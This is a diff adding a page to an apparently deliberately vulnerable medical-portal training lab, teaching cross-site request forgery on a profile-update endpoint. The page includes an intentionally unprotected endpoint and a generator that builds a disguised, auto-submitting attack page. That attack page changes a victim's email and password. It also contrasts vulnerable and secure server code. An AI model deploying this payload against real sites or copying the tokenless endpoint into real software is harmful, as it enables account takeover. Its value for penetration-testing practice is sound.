@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CSRF – MediCare Pro Lab</title>
+  <link rel="stylesheet" href="../css/styles.css">
+</head>
+<body>
+  <div class="warn-banner">⚠️ EDUCATIONAL USE ONLY — Deliberately vulnerable application for penetration testing practice.</div>
+  <div class="app-layout">
+    <div id="sidebarMount"></div>
+    <main class="main">
+      <div id="topnavMount"></div>
+      <div class="page-content">
+
+        <div class="vuln-header">
+          <div class="vuln-title-group">
+            <h1>🚫 CSRF Attack</h1>
+            <p>Profile Update Endpoint — No CSRF Token, No Origin Verification</p>
+          </div>
+          <span class="severity-badge sev-high">⚠ High Severity</span>
+        </div>
+
+        <div class="hint-box">
+          <div class="hint-title">🧪 Lab Objective — CSRF Attack</div>
+          <p>The profile update form submits to <code>POST /api/csrf-update</code> with <strong>no CSRF token</strong> and <strong>no SameSite cookie</strong>. A malicious external page can silently submit this form on behalf of a logged-in user.</p>
+          <ul style="margin-top:8px;">
+            <li>The attack page generates a hidden form pointing to this endpoint</li>
+            <li>When a logged-in user visits the attacker's page, their profile updates automatically</li>
+            <li>No interaction needed — auto-submits on page load</li>
+            <li>Use the "Generate CSRF PoC Page" button to create the attack HTML</li>
+          </ul>
+        </div>
+
+        <div class="grid-2">
+          <!-- Legitimate form -->
+          <div class="card">
+            <div class="card-header">
+              <div class="card-icon card-icon-blue">👤</div>
+              <h2>My Profile — Update Settings</h2>
+            </div>
+            <div class="card-body">
+              <div class="alert alert-danger">
+                <span>🚨</span>
+                <div><strong>Vulnerability:</strong> This form has no CSRF token. Any website can forge and auto-submit this request.</div>
+              </div>
+
+              <div id="updateSuccess" class="alert alert-success hidden">
+                <span>✅</span><div>Profile updated successfully!</div>
+              </div>
+
+              <div class="form-group">
+                <label class="form-label">Full Name</label>
+                <input type="text" class="form-control" id="pName" value="Dr. Admin">
+              </div>
+              <div class="form-group">
+                <label class="form-label">Email Address</label>
+                <input type="email" class="form-control" id="pEmail" value="admin@medicare.ph">
+              </div>
+              <div class="form-group">
+                <label class="form-label">Department</label>
+                <select class="form-control" id="pDept">
+                  <option>Administration</option>
+                  <option>Cardiology</option>
+                  <option>Neurology</option>
+                  <option>Pediatrics</option>
+                </select>
+              </div>
+              <div class="form-group">
+                <label class="form-label">New Password (optional)</label>
+                <input type="password" class="form-control" id="pPass" placeholder="Leave blank to keep current">
+              </div>
+
+              <button class="btn btn-primary" onclick="updateProfile()">Update Profile</button>
+
+              <div class="code-block" style="margin-top:14px;font-size:11px;">
+<span class="c-comment">// ❌ No CSRF token sent!</span>
+POST /api/csrf-update
+Content-Type: application/x-www-form-urlencoded
+
+name=Dr.+Admin&email=admin%40medicare.ph&dept=Administration
+              </div>
+            </div>
+          </div>
+
+          <!-- CSRF PoC Generator -->
+          <div class="card">
+            <div class="card-header">
+              <div class="card-icon card-icon-red">⚡</div>
+              <h2>CSRF PoC Page Generator</h2>
+            </div>
+            <div class="card-body">
+              <p style="font-size:13px;color:var(--gray-700);margin-bottom:16px;">Generate a malicious HTML page. When a victim visits it while logged into MediCare Pro, their profile silently changes.</p>
+
+              <div class="form-group">
+                <label class="form-label">Attacker's target name</label>
+                <input type="text" class="form-control" id="csrfName" value="HACKED_BY_ATTACKER" placeholder="New name to inject">
+              </div>
+              <div class="form-group">
+                <label class="form-label">Attacker's target email</label>
+                <input type="email" class="form-control" id="csrfEmail" value="hacker@evil.site" placeholder="Email to inject">
+              </div>
+              <div class="form-group">
+                <label class="form-label">New password to set</label>
+                <input type="text" class="form-control" id="csrfPass" value="pwned123" placeholder="Password to set on victim">
+              </div>
+
+              <button class="btn btn-danger" onclick="generatePoC()">⚡ Generate CSRF PoC HTML</button>
+              <button class="btn btn-outline" onclick="launchSimulatedAttack()" style="margin-left:8px;">🎯 Simulate Attack</button>
+
+              <div style="margin-top:14px;" id="pocWrap" class="hidden">
+                <label class="form-label">Generated CSRF Attack Page (save as .html and host it):</label>
+                <textarea class="form-control mono" id="pocOutput" rows="8" style="font-size:11px;" readonly></textarea>
+                <button class="btn btn-outline btn-sm" style="margin-top:8px;" onclick="copyPoC()">📋 Copy HTML</button>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card mt-6" style="margin-top:20px;">
+          <div class="card-header">
+            <div class="card-icon card-icon-red">🐛</div>
+            <h2>Vulnerable vs Secure Code</h2>
+          </div>
+          <div class="card-body">
+            <div class="code-block">
+<span class="c-comment">// ❌ VULNERABLE — no CSRF protection</span>
+app.post(<span class="c-str">'/api/csrf-update'</span>, (req, res) => {
+  updateUser(req.body); <span class="c-comment">// No token check, any origin allowed</span>
+  res.json({ success: <span class="c-val">true</span> });
+});
+
+<span class="c-comment">// ✅ SECURE — validate CSRF token</span>
+app.post(<span class="c-str">'/api/csrf-update'</span>, csrfMiddleware, (req, res) => {
+  <span class="c-kw">if</span> (req.body.csrf_token !== req.session.csrf_token) {
+    <span class="c-kw">return</span> res.status(<span class="c-val">403</span>).json({ error: <span class="c-str">'Invalid CSRF token'</span> });
+  }
+  updateUser(req.body);
+});
+<span class="c-comment">// Also set: Set-Cookie: session=...; SameSite=Strict; HttpOnly</span>
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </main>
+  </div>
+
+  <script src="../js/app.js"></script>
+  <script>
+    document.getElementById('sidebarMount').outerHTML = renderSidebar('csrf.html');
+    document.getElementById('topnavMount').outerHTML = renderTopnav('CSRF Attack', 'Profile Update — No token validation, cross-site requests accepted');
+
+    async function updateProfile() {
+      const payload = {
+        name: document.getElementById('pName').value,
+        email: document.getElementById('pEmail').value,
+        dept: document.getElementById('pDept').value,
+        password: document.getElementById('pPass').value
+      };
+
+      try {
+        const res = await fetch('/api/csrf-update', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+          // ❌ No CSRF token attached!
+        });
+        await res.json();
+      } catch(e) {}
+
+      // Update session data
+      const user = JSON.parse(sessionStorage.getItem('mpro_user') || '{}');
+      user.name = payload.name;
+      sessionStorage.setItem('mpro_user', JSON.stringify(user));
+
+      document.getElementById('updateSuccess').classList.remove('hidden');
+      setTimeout(() => document.getElementById('updateSuccess').classList.add('hidden'), 3000);
+    }
+
+    function generatePoC() {
+      const name = document.getElementById('csrfName').value;
+      const email = document.getElementById('csrfEmail').value;
+      const pass = document.getElementById('csrfPass').value;
+      const target = `${location.origin}/api/csrf-update`;
+
+      const html = `<!DOCTYPE html>
+<html>
+<head><title>Totally Legit Medical News</title></head>
+<body>
+  <h1>Breaking: Healthcare System Hacked!</h1>
+  <p>Click below to read more...</p>
+
+  <!-- Hidden CSRF attack form — auto-submits on page load -->
+  <form id="csrfForm" action="${target}" method="POST" style="display:none;">
+    <input name="name" value="${name}">
+    <input name="email" value="${email}">
+    <input name="password" value="${pass}">
+    <input name="dept" value="Hacked">
+    <!-- ❌ No CSRF token present -->
+  </form>
+
+  <script>
+    // Auto-submit on page load without user interaction
+    window.onload = () => document.getElementById('csrfForm').submit();
+  <\/script>
+</body>
+</html>`;
+
+      document.getElementById('pocOutput').value = html;
+      document.getElementById('pocWrap').classList.remove('hidden');
+    }
+
+    async function launchSimulatedAttack() {
+      const name = document.getElementById('csrfName').value;
+      const email = document.getElementById('csrfEmail').value;
+      const pass = document.getElementById('csrfPass').value;
+
+      alert(`⚡ Simulating CSRF attack!\n\nA forged request is being sent from "evil.site" to /api/csrf-update\n\nPayload:\n  name=${name}\n  email=${email}\n  password=${pass}\n\nNo CSRF token — request will be accepted!`);
+
+      // Simulate the forged request
+      try {
+        await fetch('/api/csrf-update', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ name, email, password: pass, dept: 'Hacked', origin: 'https://evil.site' })
+        });
+      } catch(e) {}
+
+      // Visually update the form fields
+      document.getElementById('pName').value = name;
+      document.getElementById('pEmail').value = email;
+
+      document.getElementById('updateSuccess').textContent = '';
+      document.getElementById('updateSuccess').innerHTML = `✅ CSRF Attack Successful! Profile updated to: name="${name}", email="${email}", password="${pass}"`;
+      document.getElementById('updateSuccess').classList.remove('hidden');
+    }
+
+    function copyPoC() {
+      navigator.clipboard.writeText(document.getElementById('pocOutput').value)
+        .then(() => alert('CSRF PoC HTML copied! Host this file on any web server and send the link to a logged-in MediCare Pro user.'));
+    }
+  </script>
+</body>
+</html>
